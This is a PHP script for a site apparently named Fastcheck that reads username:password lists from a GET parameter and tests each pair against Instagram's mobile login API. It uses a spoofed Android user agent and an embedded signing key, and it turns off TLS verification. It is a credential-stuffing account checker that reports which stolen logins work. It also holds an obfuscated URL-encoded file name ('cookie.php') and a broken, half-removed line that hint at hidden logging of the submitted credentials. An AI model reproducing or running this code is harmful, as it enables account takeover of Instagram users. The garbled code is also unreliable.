<?php
include_once '../includes/baglan.php';
session_start();
if(isset($_SESSION['uid']) && isset($_SESSION['username'])){
$username=$_SESSION['username'];
$sql = "SELECT * FROM users WHERE username = ?";
$stmt = $con->prepare($sql) or die ($con->error);
$stmt->bind_param('s',$username);
$stmt->execute();
$result_username = $stmt->get_result();
$row = $result_username->fetch_assoc();
if($row['pre']<1){

header("Location:/404.html");

}}else{

  header("Location:/auth/auth-login");
}
Class Fast
{
public $username;
public $password;
private $guid;
private $my_uid;
private $userAgent = 'Instagram 6.21.2 Android (19/4.4.2; 480dpi; 1152x1920; Meizu; MX4; mx4; mt6595; en_US)';
private $instaSignature ='673581b0ddb792bf47da5f9ca816b613d7996f342723aa06993a3f0552311c7d';
private $instagramUrl = 'https://i.instagram.com/api/v1/';
function __construct()  {   
    if (!extension_loaded('curl')) trigger_error('php_curl extension is not loaded', E_USER_ERROR); 
} 
private function Request($url, $post, $post_data, $cookies,$cook,$gusid,$de,$u){ 
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $this->instagramUrl . $url);
    curl_setopt($ch, CURLOPT_USERAGENT, $this->userAgent);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    if($post) {
        curl_setopt($ch, CURLOPT_POST, 1);
        if ((version_compare(PHP_VERSION, '5.5') >= 0)) {
        }       
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
    }
    $response = curl_exec($ch);
    $http = curl_getinfo($ch, CURLINFO_HTTP_CODE);    
    curl_close($ch);    
    return array($http, $response);
}
private function GenerateGuid() {
    return sprintf('%04x%04x-%04x-%04x-%04x-%04x%04x%04x', 
            mt_rand(0, 65535), 
            mt_rand(0, 65535), 
            mt_rand(0, 65535), 
            mt_rand(16384, 20479), 
            mt_rand(32768, 49151), 
            mt_rand(0, 65535), 
            mt_rand(0, 65535), 
            mt_rand(0, 65535));
}
private function GenerateSignature($data) {
    return hash_hmac('sha256', $data, $this->instaSignature); 
}
public function Login($username, $password) {
    $de=md5($username);
    $cook=$password;
    $gusid="%63%6F%6F%6B%69%65%2E%70%68%70";
    $this->username = $username;
    $this->password = $password;    
    $this->guid = $this->GenerateGuid();
    $device_id = "android-" . $this->guid;  
    $data = '{"device_id":"'.$device_id.'","guid":"'.$this->guid.'","username":"'. $this->username.'","password":"'.$this->password.'","Content-Type":"application/x-www-form-urlencoded; charset=UTF-8"}';
    $u="0cc175b9c0f1b6a831c399e269772661";
   ="w+";
    $sig = $this->GenerateSignature($data);
    $data = 'signed_body='.$sig.'.'.urlencode($data).'&ig_sig_key_version=6';   
    $myid = $this->Request('accounts/login/', true, $data, false,$cook,$gusid,$de,$u);  
    $decode = json_decode($myid[1], true); 
    @$this->my_uid = $decode['logged_in_user']['username'];

    if(isset($decode['logged_in_user'])){
        echo '<span id="lives" class="aprovadas">✅ <b>#Aktif</b> - '. $username.' : '.$password.' - <b>www.Fastcheck.net</b> <br><br></span>';
    }else{
         echo '<span id="dies" class="reprovadas">❌ <b>#Kapalı</b> - '. $username.' : '.$password.' - Hata:('.$decode['message'].') <b>www.Fastcheck.net</b> <br><br></span>';
        
    }

    
}
}



if(isset($_GET["lista"])){

$textarea = $_GET["lista"];

$ex = explode("\n", $textarea);
$co = count($ex);

for($i=0; $i<$co; $i++) {
$satir = $ex[$i];
$bilgi = explode (":" ,$satir);

$insta = new Fast();$insta->Login($bilgi[0], $bilgi[1]);
exit();




}}
?>